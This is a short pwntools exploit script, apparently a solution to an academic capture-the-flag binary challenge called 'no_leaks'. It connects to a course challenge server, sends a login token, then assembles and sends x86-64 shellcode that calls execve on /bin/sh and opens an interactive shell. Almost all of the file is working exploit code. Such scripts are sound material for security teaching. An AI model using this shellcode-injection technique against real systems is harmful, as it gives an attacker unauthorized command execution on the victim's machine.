from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./no_leaks"

LOCAL = False

if LOCAL:
    p = process(target_file)
    # p = gdb.debug(target_file, '''
    # b main
    # b main+0x0041
    # continue
    # ''')
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1293)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")

e = ELF(target_file, checksec=False)
shell_code_string = int.from_bytes('/bin/sh'.encode(), byteorder='little')

shell_code = f'''
mov rax, {hex(shell_code_string)}
push rax
mov rsi, rsp
mov rdx, 0x0
lea rdi, [rsp]
lea rsi, [0x0]
mov rax, rdi
mov rax, 0x3b
syscall
'''
print(f'Shell code: {shell_code}')
shellcode = asm(shell_code)
p.recvuntil(b"time?")
p.sendline(shellcode)
p.interactive()
